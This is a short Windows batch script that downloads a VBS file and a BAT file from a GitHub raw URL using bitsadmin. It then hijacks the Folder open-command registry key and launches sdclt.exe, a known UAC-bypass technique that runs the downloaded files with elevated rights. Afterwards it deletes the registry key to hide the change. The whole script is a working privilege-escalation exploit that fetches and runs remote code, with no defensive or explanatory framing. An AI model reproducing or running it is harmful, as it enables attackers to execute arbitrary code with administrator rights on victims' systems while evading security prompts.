bitsadmin /transfer debjob /download /priority normal https://raw.githubusercontent.com/ostajic/CodingFolder/master/run3.vbs %userprofile%\Downloads\run3.vbs
bitsadmin /transfer debjob /download /priority normal https://raw.githubusercontent.com/ostajic/CodingFolder/master/run2.bat %userprofile%\Downloads\run2.bat
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c %userprofile%\Downloads\run3.vbs %userprofile%\Downloads\run2.bat" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
%windir%\system32\sdclt.exe
ping 127.0.0.1 -n 6 > nul
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f